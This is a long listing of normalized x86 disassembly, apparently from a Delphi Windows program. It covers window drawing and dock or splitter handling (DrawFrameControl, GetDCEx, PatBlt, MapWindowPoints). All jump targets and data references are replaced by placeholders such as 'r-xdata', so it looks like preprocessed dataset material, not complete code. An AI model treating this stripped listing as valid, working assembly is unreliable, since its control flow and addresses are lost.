mov eax [ ebp - 0x10 ]
call sub_44acb8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403254
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_4539a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_41919c
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_424598
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4539f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_423994
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_42418c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_42412c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_42412c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_423994
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_42412c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_42412c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_453a80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4539a0
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_4539f8
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_4539f8
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4539a0
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_4539f8
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_4539f8
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_453b5c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423de4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453cb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_448b94
mov eax [ ebp - 0x4 ]
call sub_424164
xor eax eax
push ebp
push sub_453c95
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424618
xor eax eax
push ebp
push sub_453c78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_44d4d0
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453c7f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424618
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44d494
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_449958
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_453cc0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_44f2d0
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_449a00
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_4499bc
mov ecx eax
xor edx edx
xor eax eax
call sub_41919c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4507d8
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4191c4
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_453e34
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_453e34
pop ecx
mov eax ebx
call sub_403254
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_453e34
pop ecx
sub_453e68
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_453e34
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403254
xor eax eax
mov [ esi + 0x64 ] eax
sub_453ec4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452ed4
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_453f00
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_453f00
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45416d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x8 ]
pop eax
call sub_40426c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
mov eax [ ebx + 0x14 ]
call sub_452660
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x10 ]
pop eax
call sub_40426c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403254
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454174
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc8
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_452a10
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_452b88
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_452bc4
mov eax [ ebx + 0x18 ]
call sub_452a10
mov [ edx + 0x18 ] eax
push esi
push sub_454710
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_452f3c
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_452bc4
mov eax [ esi + 0x64 ]
call sub_452b88
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403254
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_4546e8
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403254
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_45270c
mov edx eax
mov eax edi
call sub_452bb0
mov eax edi
call sub_452a10
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_454710
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_452f3c
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_454710
mov edx [ eax + 0x14 ]
mov eax esi
call sub_452f3c
mov eax [ ebx + 0x14 ]
call sub_403254
mov eax edi
call sub_403254
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_45417c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_44f2d0
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_408160
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_452bb0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44f23c
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_452bb0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_454598
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_454710
xor edx edx
mov eax edi
call sub_452f3c
sub_454258
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_452b88
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a24
mov edx eax
mov eax ebx
call sub_452bb0
sub_454294
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404454
xor eax eax
push ebp
push sub_4542ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404264
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454306
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_45430c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4543bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_452918
mov eax [ ebp - 0x8 ]
call sub_454294
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_45430c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4543c2
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_45430c
pop ecx
sub_4543c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454501
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4544b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44f23c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4544b7
mov eax [ ebp - 0x10 ]
call sub_403254
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_454294
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44f250
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4544b7
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_45430c
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454508
lea eax [ ebp - 0x14 ]
call sub_403fa4
retn
sub_454510
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_452c60
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452c88
call sub_454510
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452c60
call sub_454510
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_452690
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_452b88
mov edx eax
mov eax ebx
call sub_452bb0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_452bb0
jmp r-xdata
sub_454598
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_454510
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_4545dc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_452b88
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_452bb0
sub_45460c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4507d8
mov edx eax
mov eax [ rw-data ]
call sub_45516c
mov eax [ ebx + 0x14 ]
call sub_4507d8
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_454720
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_45466c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_45516c
mov eax ebx
call sub_454720
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_452bb0
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_452bb0
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_454598
push ebx
push sub_454710
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_452f3c
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_4546e8
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_44f23c
test eax eax
jle r-xdata
push ebx
push sub_454710
xor edx edx
mov eax ebx
call sub_452f3c
sub_454720
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_452754
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_452754
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_4527c0
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_4527c0
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_423cc8
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_45480c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
